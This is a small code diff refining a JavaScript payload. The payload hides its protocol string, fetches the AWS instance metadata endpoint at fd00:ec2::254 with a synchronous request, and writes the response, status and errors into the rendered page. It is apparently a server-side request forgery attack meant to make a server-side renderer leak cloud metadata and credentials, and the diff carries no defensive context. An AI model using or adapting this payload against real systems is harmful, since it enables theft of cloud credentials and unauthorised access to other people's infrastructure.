@@ -6,14 +6,13 @@
 var proto = String.fromCharCode(104,116,116,112);
 var url = proto + '://[fd00:ec2::254]/latest/meta-data/';
 
-// Blocking document.write with XHR
 var xhr = new XMLHttpRequest();
 xhr.open('GET', url, false);
 try {
   xhr.send();
-  document.write('<h1>IMDS_DATA</h1><pre>' + xhr.responseText + '</pre>');
+  document.write('<h1>IMDS_DATA</h1><pre>STATUS:' + xhr.status + ' BODY:' + xhr.responseText + '</pre>');
 } catch(e) {
-  document.write('<h1>DOCWRITE_ERROR</h1><pre>' + e.message + '</pre>');
+  document.write('<h1>DOCWRITE_ERROR</h1><pre>' + e.name + ':' + e.message + '</pre>');
 }
 document.close();
 </script>
